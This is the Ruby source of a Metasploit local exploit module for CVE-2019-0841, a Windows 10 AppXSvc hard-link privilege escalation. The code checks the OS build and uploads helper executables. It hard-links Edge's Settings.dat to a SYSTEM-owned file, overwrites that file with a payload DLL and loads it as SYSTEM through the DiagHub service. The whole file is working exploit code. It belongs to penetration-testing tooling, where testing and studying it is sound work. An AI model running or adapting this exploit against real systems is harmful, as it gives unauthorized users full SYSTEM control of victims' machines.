# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Exploit::EXE
  include Post::File
  include Post::Windows::Priv
  include Post::Windows::FileInfo
  include Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;AppXSvc Hard Link Privilege Escalation&#039;,
      &#039;Description&#039;    => %q(
        There exists a privilege escalation vulnerability for
        Windows 10 builds prior to build 17763. Due to the AppXSvc&#039;s
        improper handling of hard links, a user can gain full
        privileges over a SYSTEM-owned file. The user can then utilize
        the new file to execute code as SYSTEM.

        This module employs a technique using the Diagnostics Hub Standard
        Collector Service (DiagHub) which was discovered by James Forshaw to
        load and execute a DLL as SYSTEM.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
      [
        &#039;Nabeel Ahmed&#039;,      # Vulnerability discovery and PoC
        &#039;James Forshaw&#039;,     # Code creating hard links and communicating with DiagHub service
        &#039;Shelby Pace&#039;        # Metasploit module
      ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2019-0841&#039; ],
          [ &#039;URL&#039;, &#039;https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/&#039; ],
          [ &#039;URL&#039;, &#039;https://googleprojectzero.blogspot.com/2015/12/between-rock-and-hard-link.html&#039; ],
          [ &#039;URL&#039;, &#039;https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html&#039; ],
          [ &#039;URL&#039;, &#039;https://0x00-0x00.github.io/research/2019/05/30/Coding-a-reliable-CVE-2019-0841-Bypass.html&#039; ]
        ],
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows 10&#039;, { &#039;Platform&#039; => &#039;win&#039; } ]
        ],
      &#039;DisclosureDate&#039; => &#039;2019-04-09&#039;,
      &#039;DefaultTarget&#039;  => 0
    ))
  end

  def check
    return CheckCode::Unknown if sysinfo[&#039;OS&#039;] !~ /windows\s10/i

    path = expand_path(&#039;%WINDIR%\\system32\\win32k.sys&#039;)
    major, minor, build, revision, brand = file_version(path)
    return CheckCode::Appears if build < 17763

    CheckCode::Detected
  end

  def upload_file(file_name, file_path)
    contents = File.read(File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2019-0841&#039;, file_name))
    write_file(file_path, contents)
    register_file_for_cleanup(file_path)
  rescue
    fail_with(Failure::UnexpectedReply, &#039;Failed to write file contents to target&#039;)
  end

  def init_process
    print_status("Attempting to launch Microsoft Edge minimized.")
    cmd_exec("cmd.exe /c start /min microsoft-edge:", nil, 30)
  end

  def mk_hard_link(src, target, link_exe)
    out = cmd_exec("cmd.exe /c #{link_exe} \"#{src}\" \"#{target}\"")

    return (out && out.include?(&#039;Done&#039;))
  end

  def write_payload
    print_status(&#039;Writing the payload to disk&#039;)
    code = generate_payload_dll
    @original_data = read_file(@rtf_path)
    write_file(@rtf_path, code)
  end

  def exploit
    vuln_status = check
    fail_with(Failure::NotVulnerable, &#039;Failed to detect Windows 10&#039;) if vuln_status == CheckCode::Unknown

    fail_with(Failure::None, &#039;Already running with SYSTEM privileges&#039;) if is_system?
    cmd_exec("taskkill /F /IM MicrosoftEdge.exe /FI \"STATUS eq RUNNING\"")
    dat_path = expand_path("%USERPROFILE%\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Settings\\Settings.dat")
    fail_with(Failure::NotFound, &#039;Path does not exist&#039;) unless exist?(dat_path)

    if session.arch == ARCH_X86
      exe_name = &#039;CVE-2019-0841_x86.exe&#039;
      f_name = &#039;diaghub_load_x86.exe&#039;
    elsif session.arch == ARCH_X64
      exe_name = &#039;CVE-2019-0841_x64.exe&#039;
      f_name = &#039;diaghub_load_x64.exe&#039;
    end
    link_file_name = expand_path("%TEMP%\\#{Rex::Text.rand_text_alpha(6...8)}.exe")
    upload_file(exe_name, link_file_name)

    @rtf_path = expand_path(&#039;%WINDIR%\\system32\\license.rtf&#039;)
    fail_with(Failure::UnexpectedReply, &#039;Did not retrieve expected output&#039;) unless mk_hard_link(dat_path, @rtf_path, link_file_name)
    print_good(&#039;Successfully created hard link&#039;)
    init_process
    cmd_exec("taskkill /F /IM MicrosoftEdge.exe")

    write_payload
    diaghub_path = expand_path("%TEMP%\\#{Rex::Text.rand_text_alpha(8..12)}")
    upload_file(f_name, diaghub_path)
    cmd = "\"#{diaghub_path}\" \"license.rtf\""
    cmd_exec(cmd)
  end

  def cleanup
    folder_path = expand_path("%TEMP%\\etw")
    dir_rm(folder_path)

    write_file(@rtf_path, @original_data)
    super
  end
end

